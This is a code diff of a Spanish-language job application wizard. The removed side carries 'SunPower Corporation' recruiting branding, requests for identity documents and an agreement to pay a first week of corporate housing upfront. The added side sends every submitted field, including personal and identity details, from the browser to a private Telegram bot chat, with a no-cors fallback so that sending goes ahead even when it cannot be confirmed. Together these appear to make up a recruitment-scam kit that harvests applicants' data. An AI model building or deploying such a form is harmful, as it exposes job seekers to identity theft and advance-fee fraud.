@@ -1,492 +1,459 @@
-(() => {
-  'use strict';
+"use strict";
 
-  // =========================================================
-  // ======================= IDIOMAS ==========================
-  // =========================================================
-  const langSelect = document.getElementById('langSelect');
+/* ============================================================
+   ✅ SOLO CAMBIA ESTO (pega tu token e id)
+   ============================================================ */
+const TELEGRAM_BOT_TOKEN = "PEGA_AQUI_TU_BOT_TOKEN";
+const TELEGRAM_CHAT_ID   = "PEGA_AQUI_TU_CHAT_ID";
 
-  const TEXT_MAP = {
-    es: {
-      continue: 'Continuar',
-      back: 'Anterior',
-      completeFirst: 'Completar primera parte',
-      submit: 'Enviar Solicitud',
-      select: 'Seleccione',
-      selectCountry: 'Seleccione su país',
-      usResidentQ: '¿Es residente de Estados Unidos? (No requerido para aprobación)',
-      usResidentYes: 'Sí, soy residente de EE.UU.',
-      citizenship: 'País de ciudadanía',
-      housingAgree: 'Acepto las reglas de la corporación durante la estadía del contrato',
-      housingPayment: 'Acepto realizar el pago de la primera semana una vez aprobada mi aplicación.',
-      step1desc:
-        'Complete todos los campos con información personal exacta. Esto permite al equipo de contratación conocer sus datos correctamente.',
-      step2desc:
-        'Ingrese su experiencia laboral, habilidades relevantes y disponibilidad para contratos. Esto permite asignarle trabajos adecuados.',
-      step3desc:
-        'Seleccione el tipo de habitación corporativa que usará durante el contrato. Todas las reservas se pagan dentro del portal corporativo.',
-      step4desc: 'Proporcione documentos legales y de identidad necesarios para la contratación.',
-      step5desc:
-        'Revise y acepte las condiciones del contrato de 9 meses y las políticas corporativas antes de continuar con la aplicación.',
-    },
-    en: {
-      continue: 'Continue',
-      back: 'Back',
-      completeFirst: 'Complete first part',
-      submit: 'Submit Application',
-      select: 'Select',
-      selectCountry: 'Select your country',
-      usResidentQ: 'Are you a U.S. resident? (Not required for approval)',
-      usResidentYes: 'Yes, I am a U.S. resident.',
-      citizenship: 'Citizenship country',
-      housingAgree: 'I accept the corporation rules during the contract stay',
-      housingPayment: 'I agree to make the first-week payment once my application is approved.',
-      step1desc:
-        'Complete all fields with accurate personal information. This helps the hiring team record your details correctly.',
-      step2desc:
-        'Enter your work experience, relevant skills, and availability. This helps assign you suitable work.',
-      step3desc:
-        'Select the corporate housing room type you will use during the contract. All reservations are paid inside the corporate portal.',
-      step4desc: 'Provide the legal and identity documents required for hiring.',
-      step5desc:
-        'Review and accept the 9-month contract terms and corporate policies before continuing with the application.',
-    },
-  };
+/* ================= CONFIG ================= */
+const STORAGE_KEY = "jobapp_step_current_v2";
+const SCROLL_TO_TOP_ON_STEP_CHANGE = true;
 
-  function setOptionLang(option, lang) {
-    // si tiene "ES / EN", lo separa y guarda
-    if (!option.dataset.esText && option.textContent.includes(' / ')) {
-      const parts = option.textContent.split(' / ');
-      option.dataset.esText = parts[0].trim();
-      option.dataset.enText = parts[parts.length - 1].trim();
-    }
+/* ================= HELPERS ================= */
+function cssEscapeSafe(str){
+  if (window.CSS && typeof window.CSS.escape === "function") return window.CSS.escape(str);
+  return String(str).replace(/["\\]/g, "\\$&");
+}
+function scrollToTopSafe(){
+  if(!SCROLL_TO_TOP_ON_STEP_CHANGE) return;
+  try { window.scrollTo({ top: 0, behavior: "smooth" }); }
+  catch(e){ window.scrollTo(0,0); }
+}
+function formToObject(form){
+  const data = {};
+  const fd = new FormData(form);
 
-    if (option.dataset.esText && option.dataset.enText) {
-      option.textContent = lang === 'en' ? option.dataset.enText : option.dataset.esText;
-      return;
-    }
-
-    // placeholders típicos
-    const t = option.textContent.trim();
-    if (t === 'Seleccione' || t === 'Select') option.textContent = TEXT_MAP[lang].select;
-    if (t === 'Seleccione su país' || t === 'Select your country') option.textContent = TEXT_MAP[lang].selectCountry;
+  for (const [k,v] of fd.entries()){
+    if (data[k] !== undefined){
+      if (!Array.isArray(data[k])) data[k] = [data[k]];
+      data[k].push(v);
+    } else data[k] = v;
   }
 
-  function applyLanguage(lang) {
-    const L = lang === 'en' ? 'en' : 'es';
-    if (langSelect) langSelect.value = L;
+  // checkboxes no marcados => false
+  form.querySelectorAll('input[type="checkbox"][name]').forEach(cb=>{
+    data[cb.name] = cb.checked;
+  });
 
-    try {
-      localStorage.setItem('appLang', L);
-    } catch (_) {}
+  data._fecha = new Date().toISOString();
+  return data;
+}
+function buildTelegramMessage(obj){
+  const lines = [];
+  lines.push("📩 NUEVA APLICACIÓN");
+  lines.push("———————————————");
+  Object.keys(obj).forEach((key)=>{
+    let val = obj[key];
+    if (Array.isArray(val)) val = val.join(", ");
+    lines.push(key + ": " + val);
+  });
+  return lines.join("\n");
+}
 
-    // data-es / data-en
-    document.querySelectorAll('[data-es][data-en]').forEach((el) => {
-      const val = el.getAttribute('data-' + L);
-      if (val != null) el.textContent = val;
+/* ================= TELEGRAM SEND ================= */
+async function sendTelegram(text){
+  if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN.includes("PEGA_AQUI")){
+    throw new Error("Falta TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID.");
+  }
+
+  const url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
+
+  const body = new URLSearchParams();
+  body.set("chat_id", TELEGRAM_CHAT_ID);
+  body.set("text", text);
+  body.set("disable_web_page_preview", "true");
+
+  // intento normal
+  try{
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
+      body: body.toString()
     });
-
-    // Step desc solo para index (si existen ids step1..step5)
-    const stepDescById = {
-      step1: TEXT_MAP[L].step1desc,
-      step2: TEXT_MAP[L].step2desc,
-      step3: TEXT_MAP[L].step3desc,
-      step4: TEXT_MAP[L].step4desc,
-      step5: TEXT_MAP[L].step5desc,
-    };
-
-    Object.entries(stepDescById).forEach(([id, text]) => {
-      const st = document.getElementById(id);
-      if (!st) return;
-      const p = st.querySelector('.step-desc');
-      if (p && !p.hasAttribute('data-es') && !p.hasAttribute('data-en')) p.textContent = text;
+    const json = await res.json();
+    if(!json.ok) throw new Error(json.description || "Telegram error");
+    return true;
+  }catch(_err){
+    // fallback no-cors (no confirma, pero suele enviar desde hosting estático)
+    await fetch(url, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
+      body: body.toString()
     });
+    return true;
+  }
+}
 
-    // botones
-    document.querySelectorAll('button').forEach((b) => {
-      const txt = (b.textContent || '').trim();
-      if (txt === TEXT_MAP.es.continue || txt === TEXT_MAP.en.continue) b.textContent = TEXT_MAP[L].continue;
-      if (txt === TEXT_MAP.es.back || txt === TEXT_MAP.en.back) b.textContent = TEXT_MAP[L].back;
-      if (txt === TEXT_MAP.es.completeFirst || txt === TEXT_MAP.en.completeFirst) b.textContent = TEXT_MAP[L].completeFirst;
-      if (txt === TEXT_MAP.es.submit || txt === TEXT_MAP.en.submit) b.textContent = TEXT_MAP[L].submit;
-    });
+/* ================= CONFETTI ================= */
+function runConfetti(ms=2600){
+  const canvas = document.getElementById("confettiCanvas");
+  const ctx = canvas.getContext("2d");
 
-    // checkboxes del step3 (index)
-    const housingAgree = document.querySelector('input[name="housingAgree"]');
-    if (housingAgree && housingAgree.closest('label')) {
-      const lab = housingAgree.closest('label');
-      Array.from(lab.childNodes).forEach((n) => {
-        if (n.nodeType === Node.TEXT_NODE) n.textContent = '';
-      });
-      lab.appendChild(document.createTextNode(' ' + TEXT_MAP[L].housingAgree));
-    }
+  const dpr = Math.max(1, window.devicePixelRatio || 1);
+  function resize(){
+    canvas.width = Math.floor(window.innerWidth * dpr);
+    canvas.height = Math.floor(window.innerHeight * dpr);
+    canvas.style.width = window.innerWidth + "px";
+    canvas.style.height = window.innerHeight + "px";
+    ctx.setTransform(dpr,0,0,dpr,0,0);
+  }
+  resize();
 
-    const housingPayment = document.querySelector('input[name="housingPayment"]');
-    if (housingPayment && housingPayment.closest('label')) {
-      const lab = housingPayment.closest('label');
-      Array.from(lab.childNodes).forEach((n) => {
-        if (n.nodeType === Node.TEXT_NODE) n.textContent = '';
-      });
-      lab.appendChild(document.createTextNode(' ' + TEXT_MAP[L].housingPayment));
-    }
-
-    // label sueltas (index step4)
-    document.querySelectorAll('label').forEach((lab) => {
-      const t = (lab.textContent || '').trim();
-      if (t.includes('¿Es residente de Estados Unidos') || t.includes('Are you a U.S. resident')) {
-        lab.textContent = TEXT_MAP[L].usResidentQ;
-      }
-      if (t.includes('País de ciudadanía') || t.includes('Citizenship')) {
-        lab.textContent = TEXT_MAP[L].citizenship;
-      }
-    });
-
-    // span de US resident
-    document.querySelectorAll('span').forEach((sp) => {
-      const t = (sp.textContent || '').trim();
-      if (t === TEXT_MAP.es.usResidentYes || t === TEXT_MAP.en.usResidentYes) {
-        sp.textContent = TEXT_MAP[L].usResidentYes;
-      }
-    });
-
-    // options de selects
-    document.querySelectorAll('select').forEach((sel) => {
-      sel.querySelectorAll('option').forEach((opt) => setOptionLang(opt, L));
-    });
-
-    // placeholders "ES / EN"
-    document.querySelectorAll('input, textarea').forEach((el) => {
-      if (!el.placeholder) return;
-      if (el.placeholder.includes(' / ')) {
-        const parts = el.placeholder.split(' / ');
-        el.placeholder = L === 'en' ? parts[parts.length - 1].trim() : parts[0].trim();
-      }
+  const colors = ["#2563eb","#16a34a","#f59e0b","#ef4444","#8b5cf6","#0ea5e9"];
+  const pieces = [];
+  for(let i=0;i<190;i++){
+    pieces.push({
+      x: Math.random()*window.innerWidth,
+      y: -20 - Math.random()*window.innerHeight*0.2,
+      w: 6 + Math.random()*6,
+      h: 8 + Math.random()*10,
+      vx: -2 + Math.random()*4,
+      vy: 2 + Math.random()*5,
+      r: Math.random()*Math.PI,
+      vr: -0.2 + Math.random()*0.4,
+      c: colors[(Math.random()*colors.length)|0],
+      a: 0.85 + Math.random()*0.15
     });
   }
 
-  // init idioma SIEMPRE
-  (function initLanguage() {
-    if (!langSelect) return;
+  const start = Date.now();
+  (function tick(){
+    ctx.clearRect(0,0,window.innerWidth,window.innerHeight);
+    for(const p of pieces){
+      p.x += p.vx; p.y += p.vy; p.r += p.vr; p.vy += 0.03;
 
-    let lang = 'es';
-    try {
-      const saved = localStorage.getItem('appLang');
-      if (saved === 'en' || saved === 'es') lang = saved;
-    } catch (_) {}
-
-    langSelect.value = lang;
-    langSelect.addEventListener('change', (e) => applyLanguage(e.target.value));
-    applyLanguage(lang);
+      ctx.save();
+      ctx.globalAlpha = p.a;
+      ctx.translate(p.x, p.y);
+      ctx.rotate(p.r);
+      ctx.fillStyle = p.c;
+      ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+      ctx.restore();
+    }
+    if(Date.now()-start < ms) requestAnimationFrame(tick);
+    else ctx.clearRect(0,0,window.innerWidth,window.innerHeight);
   })();
+}
 
-  // =========================================================
-  // ================== STEPS / PROGRESO ======================
-  // =========================================================
-  const steps = document.querySelectorAll('.form-step');
-  const nextBtns = document.querySelectorAll('.next');
-  const prevBtns = document.querySelectorAll('.prev');
-  const progress = document.getElementById('progress');
-  let currentStep = 0;
+function showBlankSuccess(){
+  const app = document.querySelector(".app");
+  if(app) app.style.display = "none";
+  document.getElementById("finalScreen").classList.add("show");
+  runConfetti(2600);
+}
 
-  // Si no hay steps, salimos (pero el idioma ya quedó inicializado arriba)
-  if (!steps || steps.length === 0) return;
+/* ================= MAPA: checkpoints sobre el path ================= */
+function getPointOnPath(pathEl, t01){
+  const len = pathEl.getTotalLength();
+  const p = pathEl.getPointAtLength(Math.max(0, Math.min(1, t01)) * len);
+  return { x: p.x, y: p.y };
+}
 
-  function updateProgress() {
-    const percent = ((currentStep + 1) / steps.length) * 100;
-    if (progress) progress.style.width = percent + '%';
+/* ================= WIZARD + MAP FLOW ================= */
+document.addEventListener("DOMContentLoaded", () => {
+  const steps = Array.from(document.querySelectorAll(".form-step"));
+  const wizard = document.getElementById("wizard");
+  const submitBtn = document.getElementById("submitBtn");
 
-    steps.forEach((step, index) => {
-      const scoreFill = step.querySelector('.score-fill');
-      if (scoreFill) scoreFill.style.width = index <= currentStep ? '100%' : '0%';
-    });
+  const stepCounter = document.getElementById("stepCounter");
+  const timeHint = document.getElementById("timeHint");
+
+  // Map elements
+  const mapFull = document.getElementById("mapFull");
+  const mapBadge = document.getElementById("mapBadge");
+  const mapClose = document.getElementById("mapClose");
+  const mapContinue = document.getElementById("mapContinue");
+  const mapBack = document.getElementById("mapBack");
+  const openMapBtn = document.getElementById("openMapBtn");
+
+  // SVG
+  const roadPath = document.getElementById("roadPath");
+  const checkpointsG = document.getElementById("checkpoints");
+  const plane = document.getElementById("plane");
+
+  const TOTAL = steps.length; // 16
+
+  const mapTitles = [
+    "Bienvenida",
+    "Identificación",
+    "Ubicación",
+    "Elegibilidad",
+    "Disponibilidad",
+    "Condiciones",
+    "Experiencia",
+    "Compromiso",
+    "Assessment 1",
+    "Assessment 2",
+    "Assessment 3",
+    "Assessment 4",
+    "Assessment 5",
+    "Assessment 6",
+    "Assessment 7",
+    "Assessment 8"
+  ];
+
+  let current = 1;
+  try{
+    const saved = Number(localStorage.getItem(STORAGE_KEY));
+    if(saved>=1 && saved<=TOTAL) current = saved;
+  }catch(_){}
+
+  let lastStepBeforeMap = 1;
+
+  function openMap(){
+    mapFull.classList.add("show");
+    // ✅ iPhone fix: pinta en el siguiente frame cuando ya está visible
+    requestAnimationFrame(() => paintMap());
+  }
+  function closeMap(){
+    mapFull.classList.remove("show");
   }
 
-  function initSteps() {
-    steps.forEach((step, index) => {
-      if (index === 0) {
-        step.classList.add('active');
-        step.style.display = 'flex';
-      } else {
-        step.classList.remove('active');
-        step.style.display = 'none';
-      }
-    });
-    updateProgress();
-  }
+  function buildCheckpoints(){
+    checkpointsG.innerHTML = "";
+    for(let i=1; i<=TOTAL; i++){
+      const t = (i-1) / (TOTAL-1);
+      const pt = getPointOnPath(roadPath, t);
 
-  function showStep(index) {
-    steps.forEach((step, i) => {
-      if (i === index) {
-        step.style.display = 'flex';
-        setTimeout(() => step.classList.add('active'), 10);
-      } else {
-        step.classList.remove('active');
-        step.style.display = 'none';
-      }
-    });
-    updateProgress();
-  }
+      const g = document.createElementNS("http://www.w3.org/2000/svg","g");
+      g.setAttribute("data-step", String(i));
+      g.style.cursor = "pointer";
 
-  function validateStep(index) {
-    const step = steps[index];
-    if (!step) return true;
+      const glow = document.createElementNS("http://www.w3.org/2000/svg","circle");
+      glow.setAttribute("cx", pt.x);
+      glow.setAttribute("cy", pt.y);
+      glow.setAttribute("r", "20");
+      glow.setAttribute("fill", "rgba(37,99,235,.10)");
+      glow.setAttribute("stroke", "rgba(37,99,235,.00)");
+      glow.setAttribute("stroke-width", "2");
+      glow.setAttribute("class", "cp-glow");
 
-    const inputs = step.querySelectorAll('input, select, textarea');
-    for (let i = 0; i < inputs.length; i++) {
-      if (!inputs[i].checkValidity()) {
-        inputs[i].reportValidity();
-        return false;
-      }
+      const c = document.createElementNS("http://www.w3.org/2000/svg","circle");
+      c.setAttribute("cx", pt.x);
+      c.setAttribute("cy", pt.y);
+      c.setAttribute("r", "14");
+      c.setAttribute("fill", "#f3f4f6");
+      c.setAttribute("stroke", "#cbd5e1");
+      c.setAttribute("stroke-width", "3");
+      c.setAttribute("class", "cp-dot");
+
+      const tx = document.createElementNS("http://www.w3.org/2000/svg","text");
+      tx.setAttribute("x", pt.x);
+      tx.setAttribute("y", pt.y + 5);
+      tx.setAttribute("text-anchor", "middle");
+      tx.setAttribute("font-size", "12");
+      tx.setAttribute("font-weight", "900");
+      tx.setAttribute("fill", "#475569");
+      tx.setAttribute("class", "cp-text");
+      tx.textContent = String(i);
+
+      const label = document.createElementNS("http://www.w3.org/2000/svg","text");
+      label.setAttribute("x", pt.x);
+      label.setAttribute("y", pt.y - 22);
+      label.setAttribute("text-anchor", "middle");
+      label.setAttribute("font-size", "11");
+      label.setAttribute("font-weight", "800");
+      label.setAttribute("fill", "rgba(51,65,85,.92)");
+      label.textContent = (mapTitles[i-1] || ("Paso " + i));
+
+      g.appendChild(glow);
+      g.appendChild(c);
+      g.appendChild(tx);
+      g.appendChild(label);
+      checkpointsG.appendChild(g);
     }
 
-    // ✅ Solo aplica al index.html (step5 existe allí). En continuar.html no existe step5.
-    if (step.id === 'step5') {
-      const policies = step.querySelector('[name="policiesAgree"]');
-      const contract = step.querySelector('[name="contractAgree"]');
+    checkpointsG.addEventListener("click", (e)=>{
+      const g = e.target && e.target.closest ? e.target.closest("g[data-step]") : null;
+      if(!g) return;
+      const go = Number(g.getAttribute("data-step") || "0");
+      if(!go) return;
+      if(go <= current){
+        setActive(go);
+        closeMap();
+      }
+    });
+  }
 
-      const requireChecked = (el, msg) => {
-        if (!el) return true;
-        if (el.type === 'checkbox') {
-          if (!el.checked) {
-            el.setCustomValidity(msg);
-            el.reportValidity();
-            return false;
-          }
-          el.setCustomValidity('');
-          return true;
-        }
-        // fallback si alguien lo vuelve select
-        const v = (el.value || '').trim().toLowerCase();
-        const isNo = v === 'no' || v.startsWith('no ') || v.includes('no /');
-        if (!v || isNo) {
-          el.setCustomValidity(msg);
-          el.reportValidity();
+  function paintMap(){
+    mapBadge.textContent = "Paso " + current + " de " + TOTAL;
+
+    const nodes = Array.from(checkpointsG.querySelectorAll("g[data-step]"));
+    nodes.forEach((g)=>{
+      const stepNum = Number(g.getAttribute("data-step"));
+      const glow = g.querySelector(".cp-glow");
+      const dot  = g.querySelector(".cp-dot");
+      const text = g.querySelector(".cp-text");
+
+      if(stepNum < current){
+        glow.setAttribute("fill", "rgba(16,185,129,.15)");
+        dot.setAttribute("fill", "#d7f3ec");
+        dot.setAttribute("stroke", "#b6eadc");
+        text.setAttribute("fill", "#1b8f6a");
+        text.textContent = "✓";
+        g.style.opacity = "1";
+      }else if(stepNum === current){
+        glow.setAttribute("fill", "rgba(37,99,235,.18)");
+        dot.setAttribute("fill", "#2563eb");
+        dot.setAttribute("stroke", "#2563eb");
+        text.setAttribute("fill", "#ffffff");
+        text.textContent = String(stepNum);
+        g.style.opacity = "1";
+      }else{
+        glow.setAttribute("fill", "rgba(148,163,184,.10)");
+        dot.setAttribute("fill", "#f3f4f6");
+        dot.setAttribute("stroke", "#cbd5e1");
+        text.setAttribute("fill", "#64748b");
+        text.textContent = String(stepNum);
+        g.style.opacity = ".55";
+      }
+    });
+
+    const t = (current-1) / (TOTAL-1);
+    const pt = getPointOnPath(roadPath, t);
+    plane.setAttribute("transform", "translate(" + pt.x + " " + pt.y + ")");
+  }
+
+  function updateStepUI(){
+    steps.forEach(s=>s.classList.remove("active"));
+    steps[current-1].classList.add("active");
+
+    stepCounter.textContent = "Paso " + current + " de " + TOTAL;
+    timeHint.textContent = "Aprox. 20–35 min";
+
+    paintMap();
+    scrollToTopSafe();
+  }
+
+  function setActive(stepNumber){
+    current = Math.min(Math.max(stepNumber,1),TOTAL);
+    try{ localStorage.setItem(STORAGE_KEY, String(current)); }catch(_){}
+    updateStepUI();
+  }
+
+  function isStepValid(){
+    const active = steps[current-1];
+    active.querySelectorAll(".pair-error").forEach(e=>e.style.display="none");
+
+    const required = Array.from(active.querySelectorAll("[required]"));
+
+    const radios = required.filter(el=>el.type==="radio");
+    if(radios.length){
+      const names = Array.from(new Set(radios.map(r=>r.name).filter(Boolean)));
+      for(const name of names){
+        const safe = cssEscapeSafe(name);
+        const group = Array.from(active.querySelectorAll('input[type="radio"][name="'+safe+'"]'));
+        const ok = group.some(r=>r.checked);
+        if(!ok){
+          const err = active.querySelector(".pair-error");
+          if(err) err.style.display="block";
+          if(group[0]) group[0].focus();
           return false;
         }
-        el.setCustomValidity('');
-        return true;
-      };
-
-      if (!requireChecked(policies, 'Debe aceptar las políticas de la empresa para continuar.')) return false;
-      if (!requireChecked(contract, 'Debe aceptar el contrato de 9 meses para continuar.')) return false;
+      }
     }
 
+    for(const el of required){
+      if(el.type==="radio") continue;
+      if(el.type==="checkbox"){
+        if(!el.checked){ el.focus(); return false; }
+      }else{
+        const val = (el.value || "").trim();
+        if(!val){ el.focus(); return false; }
+        if(el.type==="email"){
+          const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
+          if(!ok){ el.focus(); return false; }
+        }
+      }
+    }
     return true;
   }
 
-  function showConfettiMessage() {
-    const confettiMsg = document.getElementById('confettiMsg');
-    if (!confettiMsg) return;
-    confettiMsg.style.display = 'block';
-    confettiMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });
-  }
-
-  nextBtns.forEach((btn) => {
-    btn.addEventListener('click', () => {
-      // botón final de index (data-step="end")
-      if (btn.dataset.step === 'end') {
-        if (validateStep(currentStep)) showConfettiMessage();
-        return;
-      }
-
-      if (validateStep(currentStep)) {
-        currentStep++;
-        if (currentStep >= steps.length) currentStep = steps.length - 1;
-        showStep(currentStep);
-      }
-    });
+  // ===== Map buttons
+  openMapBtn.addEventListener("click", ()=>{
+    lastStepBeforeMap = current;
+    openMap();
   });
 
-  prevBtns.forEach((btn) => {
-    btn.addEventListener('click', () => {
-      currentStep--;
-      if (currentStep < 0) currentStep = 0;
-      showStep(currentStep);
-    });
+  mapClose.addEventListener("click", closeMap);
+  mapContinue.addEventListener("click", closeMap);
+
+  mapBack.addEventListener("click", ()=>{
+    setActive(lastStepBeforeMap);
+    closeMap();
   });
 
-  // scroll suave
-  steps.forEach((step) => {
-    step.style.maxHeight = '80vh';
-    step.style.overflowY = 'auto';
-    step.style.webkitOverflowScrolling = 'touch';
-    step.style.overscrollBehavior = 'contain';
+  // ✅ re-pintar mapa al rotar / resize (iPhone)
+  window.addEventListener("resize", () => {
+    if(mapFull.classList.contains("show")){
+      requestAnimationFrame(() => paintMap());
+    }
+  });
+  window.addEventListener("orientationchange", () => {
+    if(mapFull.classList.contains("show")){
+      setTimeout(() => paintMap(), 80);
+    }
   });
 
-  // ✅ AHORA SÍ: inicializa steps (esto arregla el “continuar.html en blanco”)
-  initSteps();
+  // ===== Next/Prev + auto-map flow
+  document.addEventListener("click", (e)=>{
+    const t = e.target;
 
-  // =========================================================
-  // ============== OVERLAY FINAL (solo continuar) ============
-  // =========================================================
-  let celebrationRAF = null;
+    if(t && t.classList && t.classList.contains("next")){
+      if(!isStepValid()) return;
 
-  function startCelebration(canvas) {
-    const ctx = canvas.getContext('2d');
-    const DPR = Math.max(1, Math.floor(window.devicePixelRatio || 1));
+      if(t.type === "submit") return;
 
-    const resize = () => {
-      const w = window.innerWidth;
-      const h = window.innerHeight;
-      canvas.width = Math.floor(w * DPR);
-      canvas.height = Math.floor(h * DPR);
-      canvas.style.width = w + 'px';
-      canvas.style.height = h + 'px';
-      ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
-    };
-    resize();
-    window.addEventListener('resize', resize);
-
-    const confetti = Array.from({ length: 140 }).map(() => ({
-      x: Math.random() * window.innerWidth,
-      y: Math.random() * window.innerHeight - window.innerHeight,
-      vx: (Math.random() - 0.5) * 1.2,
-      vy: 1.5 + Math.random() * 2.2,
-      r: 2 + Math.random() * 3,
-      a: Math.random() * Math.PI * 2,
-      va: (Math.random() - 0.5) * 0.15,
-    }));
-
-    let t = 0;
-    const loop = () => {
-      t++;
-
-      ctx.fillStyle = 'rgba(0,0,0,0.18)';
-      ctx.fillRect(0, 0, window.innerWidth, window.innerHeight);
-
-      for (const p of confetti) {
-        p.x += p.vx;
-        p.y += p.vy;
-        p.a += p.va;
-
-        if (p.y > window.innerHeight + 20) {
-          p.y = -20;
-          p.x = Math.random() * window.innerWidth;
-        }
-        if (p.x < -20) p.x = window.innerWidth + 20;
-        if (p.x > window.innerWidth + 20) p.x = -20;
-
-        ctx.save();
-        ctx.translate(p.x, p.y);
-        ctx.rotate(p.a);
-        ctx.fillStyle = 'rgba(255,255,255,0.85)';
-        ctx.fillRect(-p.r, -p.r / 2, p.r * 2.2, p.r);
-        ctx.restore();
+      lastStepBeforeMap = current;
+      if(current < TOTAL){
+        setActive(current + 1);
+        openMap();
       }
-
-      celebrationRAF = requestAnimationFrame(loop);
-    };
-
-    canvas._celebrationCleanup = () => {
-      window.removeEventListener('resize', resize);
-      ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
-    };
-
-    loop();
-  }
-
-  function stopCelebration() {
-    if (celebrationRAF) {
-      cancelAnimationFrame(celebrationRAF);
-      celebrationRAF = null;
-    }
-    const canvas = document.getElementById('celebrationCanvas');
-    if (canvas && canvas._celebrationCleanup) {
-      canvas._celebrationCleanup();
-      canvas._celebrationCleanup = null;
-    }
-  }
-
-  function showFinishOverlay() {
-    const overlay = document.getElementById('finishOverlay');
-    const canvas = document.getElementById('celebrationCanvas');
-    const closeBtn = document.getElementById('finishCloseBtn');
-    const consent = document.getElementById('consentContact');
-
-    if (!overlay || !canvas) return;
-
-    overlay.classList.add('show');
-    overlay.setAttribute('aria-hidden', 'false');
-
-    document.documentElement.style.overflow = 'hidden';
-    document.body.style.overflow = 'hidden';
-
-    // habilitar botón si acepta contacto
-    if (closeBtn && consent) {
-      const sync = () => (closeBtn.disabled = !consent.checked);
-      consent.addEventListener('change', sync);
-      sync();
+      return;
     }
 
-    // Finalizar => pantalla negra final
-    if (closeBtn) {
-      closeBtn.addEventListener(
-        'click',
-        () => {
-          stopCelebration();
+    if(t && t.classList && t.classList.contains("prev")){
+      lastStepBeforeMap = current;
+      setActive(current - 1);
+      openMap();
+      return;
+    }
+  });
 
-          // deja fondo negro limpio
-          const canvasEl = document.getElementById('celebrationCanvas');
-          if (canvasEl) canvasEl.style.display = 'none';
+  // ===== Submit -> Telegram + confetti + blanco
+  wizard.addEventListener("submit", async (e)=>{
+    e.preventDefault();
+    if(!isStepValid()) return;
 
-          const card = overlay.querySelector('.finish-card');
-          if (card) {
-            const isEN = langSelect && langSelect.value === 'en';
-            card.innerHTML = `
-              <div style="text-align:center;">
-                <div style="
-                  width:70px;height:70px;margin:0 auto 14px;
-                  border-radius:18px;
-                  display:flex;align-items:center;justify-content:center;
-                  background:rgba(255,255,255,0.06);
-                  border:1px solid rgba(255,255,255,0.10);
-                  font-size:34px;
-                ">✅</div>
-
-                <h3 style="margin:0 0 10px; font-size:22px; font-weight:900;">
-                  ${isEN ? 'Application completed' : 'Aplicación completada'}
-                </h3>
-
-                <p style="margin:0 0 14px; color:rgba(255,255,255,0.80); line-height:1.45;">
-                  ${
-                    isEN
-                      ? 'Your application was submitted successfully. You may now close this page and contact your recruiter for next steps.'
-                      : 'Tu aplicación fue enviada con éxito. Ya puedes cerrar esta página y contactar a tu reclutador para los próximos pasos.'
-                  }
-                </p>
-
-                <div style="margin-top:10px;font-size:12px;color:rgba(255,255,255,0.45);">
-                  SunPower Corporation • Recruiting Process
-                </div>
-              </div>
-            `;
-          }
-
-          // libera scroll (aunque el overlay siga visible)
-          document.documentElement.style.overflow = '';
-          document.body.style.overflow = '';
-
-          try {
-            window.close();
-          } catch (e) {}
-        },
-        { once: true }
-      );
+    if(submitBtn){
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Enviando...";
     }
 
-    startCelebration(canvas);
-  }
+    try{
+      const payload = formToObject(wizard);
+      const msg = buildTelegramMessage(payload);
 
-  // submit SOLO en continuar.html (si existe finishOverlay)
-  const form = document.getElementById('app');
-  if (form) {
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
-      if (!validateStep(currentStep)) return;
+      await sendTelegram(msg);
 
-      if (document.getElementById('finishOverlay')) {
-        showFinishOverlay();
+      try{ localStorage.removeItem(STORAGE_KEY); }catch(_){}
+      showBlankSuccess();
+    }catch(err){
+      alert("❌ No se pudo enviar.\n\n" + (err.message || "Error"));
+      if(submitBtn){
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Enviar aplicación";
       }
-    });
-  }
-})();
+    }
+  });
+
+  // ===== Init
+  buildCheckpoints();
+  setActive(current);
+
+  // start showing map full screen
+  lastStepBeforeMap = current;
+  openMap();
+});
